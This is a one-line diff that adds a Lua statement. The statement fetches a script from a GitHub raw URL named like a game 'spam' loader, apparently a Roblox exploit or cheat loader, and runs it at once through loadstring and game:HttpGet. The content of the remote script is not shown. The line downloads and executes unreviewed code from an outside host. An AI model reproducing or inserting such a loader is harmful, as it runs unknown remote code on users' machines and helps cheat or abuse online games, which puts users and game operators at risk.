@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/fake-an-egg-spam3-hfvniqnqmkcjrn.lua"))()
